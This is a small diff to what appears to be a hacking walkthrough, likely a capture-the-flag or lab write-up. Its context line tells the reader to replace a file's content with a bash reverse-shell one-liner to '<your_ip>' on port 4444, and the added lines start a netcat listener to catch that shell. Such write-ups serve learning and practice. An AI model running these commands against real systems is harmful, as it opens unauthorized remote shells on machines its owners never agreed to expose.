@@ -293,6 +293,11 @@ change the file content to `bash -c 'exec bash -i &>/dev/tcp/<your_ip>/4444 <&1'
 
 ![image](https://user-images.githubusercontent.com/90561566/196371436-d99633d1-b1f6-419b-97c9-6a08618fbf5d.png)
 
+run a listener by netcat
+
+```
+nc -vlnp 4444
+```
 
 
 
